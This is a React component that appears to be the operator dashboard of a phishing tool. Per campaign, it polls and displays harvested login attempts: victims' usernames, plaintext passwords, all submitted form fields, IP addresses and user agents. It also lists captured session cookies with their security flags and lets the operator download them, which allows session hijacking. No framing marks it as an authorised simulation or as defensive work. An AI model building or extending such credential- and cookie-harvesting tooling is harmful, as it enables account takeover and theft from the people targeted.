import React, { useState, useEffect } from 'react';
import { fetchLoginAttempts, downloadCookies } from '../../services/apiService';
import httpClient from '../../services/httpClient';
import config from '../../config/apiConfig';

const LoginAttemptsList = ({ campaignId }) => {
  const [loginAttempts, setLoginAttempts] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [expandedIds, setExpandedIds] = useState({});

  useEffect(() => {
    if (!campaignId) return;

    const fetchData = async () => {
      try {
        setLoading(true);
        const response = await fetchLoginAttempts(campaignId);
        setLoginAttempts(response.loginAttempts || []);
        setError(null);
      } catch (err) {
        console.error('Error fetching login attempts:', err);
        setError(err.response?.data?.message || 'Failed to load login attempts');
      } finally {
        setLoading(false);
      }
    };

    const intervalId = setInterval(fetchData, 10000); 
    fetchData(); 

    return () => clearInterval(intervalId); 
  }, [campaignId]);

  const formatDate = (timestamp) => {
    return new Date(timestamp).toLocaleString();
  };

  const handleDownloadCookies = (attemptId) => {
    try {
      downloadCookies(attemptId);
    } catch (error) {
      console.error('Error downloading cookies:', error);
      alert('Failed to download cookies. Please try again.');
    }
  };

  const toggleExpand = (id) => {
    setExpandedIds(prev => ({
      ...prev,
      [id]: !prev[id]
    }));
  };

  if (loading && loginAttempts.length === 0) {
    return (
      <div className="bg-white rounded-lg shadow p-6 my-4">
        <h2 className="text-xl font-bold text-gray-800 mb-4">Login Attempts</h2>
        <div className="flex justify-center">
          <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-500"></div>
        </div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="bg-white rounded-lg shadow p-6 my-4">
        <h2 className="text-xl font-bold text-gray-800 mb-4">Login Attempts</h2>
        <p className="text-red-500">{error}</p>
      </div>
    );
  }

  if (!loginAttempts || loginAttempts.length === 0) {
    return (
      <div className="bg-white rounded-lg shadow p-6 my-4">
        <h2 className="text-xl font-bold text-gray-800 mb-4">Login Attempts</h2>
        <p className="text-gray-500">No login attempts have been recorded yet for this campaign.</p>
      </div>
    );
  }

  return (
    <div className="bg-white rounded-lg shadow p-6 my-4">
      <h2 className="text-xl font-bold text-gray-800 mb-4">
        Login Attempts ({loginAttempts.length} total)
      </h2>

      <div className="space-y-6">
        {loginAttempts.map((attempt) => (
          <div key={attempt.id} className="border rounded-lg p-4 bg-gray-50">
            <div className="flex justify-between items-start">
              <h3 className="font-semibold text-gray-700">
                Login attempt by {attempt.targetEmail}
              </h3>
              <span className="text-sm text-gray-500">{formatDate(attempt.timestamp)}</span>
            </div>

            <div className="mt-3 grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <h4 className="font-semibold text-sm text-gray-700">Credentials Used</h4>
                <div className="bg-white p-3 rounded border mt-1">
                  {attempt.username && (
                    <div className="mb-1">
                      <span className="font-medium">Username:</span> {attempt.username}
                    </div>
                  )}
                  {attempt.password && (
                    <div className="mb-1">
                      <span className="font-medium">Password:</span> {attempt.password}
                    </div>
                  )}
                  {attempt.inputEmail && (
                    <div className="mb-1">
                      <span className="font-medium">Email:</span> {attempt.inputEmail}
                    </div>
                  )}
                  {!attempt.username && !attempt.password && !attempt.inputEmail && (
                    <div className="text-gray-500 italic">No credentials captured</div>
                  )}
                </div>

                {/* Form Fields Section */}
                {attempt.formFields && attempt.formFields.length > 0 && (
                  <div className="mt-3">
                    <h4 className="font-semibold text-sm text-gray-700">
                      All Form Fields 
                      <button 
                        onClick={() => toggleExpand(`form-${attempt.id}`)} 
                        className="ml-2 text-blue-500 text-xs hover:text-blue-700"
                      >
                        {expandedIds[`form-${attempt.id}`] ? 'Hide' : 'Show'}
                      </button>
                    </h4>
                    {expandedIds[`form-${attempt.id}`] && (
                      <div className="bg-white p-3 rounded border mt-1 max-h-60 overflow-y-auto">
                        <table className="min-w-full divide-y divide-gray-200">
                          <thead className="bg-gray-50">
                            <tr>
                              <th className="px-3 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Field Name</th>
                              <th className="px-3 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Value</th>
                            </tr>
                          </thead>
                          <tbody className="divide-y divide-gray-200 text-sm">
                            {attempt.formFields.map((field, idx) => (
                              <tr key={`${attempt.id}-field-${idx}`}>
                                <td className="px-3 py-2 whitespace-nowrap font-medium">{field.name}</td>
                                <td className="px-3 py-2 whitespace-normal break-all">
                                  {typeof field.value === 'object' ? JSON.stringify(field.value) : String(field.value)}
                                </td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      </div>
                    )}
                  </div>
                )}
              </div>
              
              <div>
                <h4 className="font-semibold text-sm text-gray-700">Cookies</h4>
                <div className="bg-white p-3 rounded border mt-1">
                  {attempt.hasCookies ? (
                    <div>
                      <div className="mb-2">{attempt.cookiesCount || attempt.cookies?.length || 0} cookies captured</div>
                      
                      <div className="flex flex-col space-y-2">
                        <button
                          onClick={() => handleDownloadCookies(attempt.id)}
                          className="px-3 py-1 bg-blue-500 text-white rounded hover:bg-blue-600 transition flex items-center space-x-1"
                        >
                          <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
                          </svg>
                          <span>Download Cookies</span>
                        </button>
                        
                        <button
                          onClick={() => toggleExpand(`cookies-${attempt.id}`)}
                          className="px-3 py-1 bg-gray-500 text-white rounded hover:bg-gray-600 transition flex items-center space-x-1"
                        >
                          <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                          </svg>
                          <span>{expandedIds[`cookies-${attempt.id}`] ? 'Hide Cookies' : 'View Cookies'}</span>
                        </button>
                      </div>
                      
                      {expandedIds[`cookies-${attempt.id}`] && attempt.cookies && attempt.cookies.length > 0 && (
                        <div className="mt-3 max-h-60 overflow-y-auto">
                          <table className="min-w-full divide-y divide-gray-200">
                            <thead className="bg-gray-50">
                              <tr>
                                <th className="px-3 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Name</th>
                                <th className="px-3 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Value</th>
                                <th className="px-3 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Domain</th>
                                <th className="px-3 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Path</th>
                                <th className="px-3 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Expiration</th>
                                <th className="px-3 py-2 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Flags</th>
                              </tr>
                            </thead>
                            <tbody className="divide-y divide-gray-200 text-sm">
                              {attempt.cookies.map((cookie, idx) => (
                                <tr key={`${attempt.id}-cookie-${idx}`}>
                                  <td className="px-3 py-2 whitespace-nowrap font-medium">{cookie.name}</td>
                                  <td className="px-3 py-2 whitespace-normal break-all max-w-[200px]">{cookie.value}</td>
                                  <td className="px-3 py-2 whitespace-nowrap">{cookie.domain || '—'}</td>
                                  <td className="px-3 py-2 whitespace-nowrap">{cookie.path || '/'}</td>
                                  <td className="px-3 py-2 whitespace-nowrap">
                                    {cookie.expirationDate ? new Date(cookie.expirationDate * 1000).toLocaleString() : 'Session'}
                                  </td>
                                  <td className="px-3 py-2 whitespace-nowrap">
                                    <div className="flex flex-wrap gap-1">
                                      {cookie.httpOnly && <span className="px-1 py-0.5 bg-blue-100 text-blue-800 text-xs rounded">HttpOnly</span>}
                                      {cookie.secure && <span className="px-1 py-0.5 bg-green-100 text-green-800 text-xs rounded">Secure</span>}
                                      {cookie.hostOnly && <span className="px-1 py-0.5 bg-purple-100 text-purple-800 text-xs rounded">HostOnly</span>}
                                      {cookie.session && <span className="px-1 py-0.5 bg-yellow-100 text-yellow-800 text-xs rounded">Session</span>}
                                      {cookie.sameSite && <span className="px-1 py-0.5 bg-gray-100 text-gray-800 text-xs rounded">SameSite={cookie.sameSite}</span>}
                                    </div>
                                  </td>
                                </tr>
                              ))}
                            </tbody>
                          </table>
                        </div>
                      )}
                    </div>
                  ) : (
                    <div className="text-gray-500 italic">No cookies captured</div>
                  )}
                </div>
              </div>
            </div>

            <div className="mt-4">
              <h4 className="font-semibold text-sm text-gray-700">Additional Info</h4>
              <table className="min-w-full divide-y divide-gray-200 mt-1">
                <tbody className="bg-white divide-y divide-gray-200">
                  <tr>
                    <td className="px-3 py-2 whitespace-nowrap text-sm font-medium text-gray-900">Target Email</td>
                    <td className="px-3 py-2 whitespace-normal text-sm text-gray-700">{attempt.targetEmail}</td>
                  </tr>
                  <tr>
                    <td className="px-3 py-2 whitespace-nowrap text-sm font-medium text-gray-900">URL</td>
                    <td className="px-3 py-2 whitespace-normal text-sm text-gray-700">{attempt.url}</td>
                  </tr>
                  <tr>
                    <td className="px-3 py-2 whitespace-nowrap text-sm font-medium text-gray-900">IP Address</td>
                    <td className="px-3 py-2 whitespace-normal text-sm text-gray-700">{attempt.ipAddress || 'Not captured'}</td>
                  </tr>
                  <tr>
                    <td className="px-3 py-2 whitespace-nowrap text-sm font-medium text-gray-900">User Agent</td>
                    <td className="px-3 py-2 whitespace-normal text-sm text-gray-700 break-all">
                      {attempt.userAgent || 'Not captured'}
                    </td>
                  </tr>
                  {attempt.captureMethod && (
                    <tr>
                      <td className="px-3 py-2 whitespace-nowrap text-sm font-medium text-gray-900">Capture Method</td>
                      <td className="px-3 py-2 whitespace-normal text-sm text-gray-700">
                        {attempt.captureMethod}
                      </td>
                    </tr>
                  )}
                </tbody>
              </table>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
};

export default LoginAttemptsList;